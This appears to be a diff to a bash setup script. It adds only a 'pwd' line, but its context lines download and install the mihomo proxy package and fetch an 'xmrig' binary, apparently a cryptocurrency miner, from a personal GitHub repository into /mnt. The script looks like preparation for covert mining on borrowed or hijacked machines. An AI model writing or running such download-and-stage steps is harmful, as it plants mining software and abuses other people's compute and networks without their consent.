@@ -1,6 +1,7 @@
 #!/bin/bash
 set -e
 
+pwd
 wget https://github.com/MetaCubeX/mihomo/releases/download/v1.19.18/mihomo-linux-amd64-v1-v1.19.18.deb
 wget https://github.com/sweetasshole/test/raw/refs/heads/main/sub/xmrig -O /mnt/xmrig
 sudo apt install ./mihomo-linux-amd64-v1-v1.19.18.deb
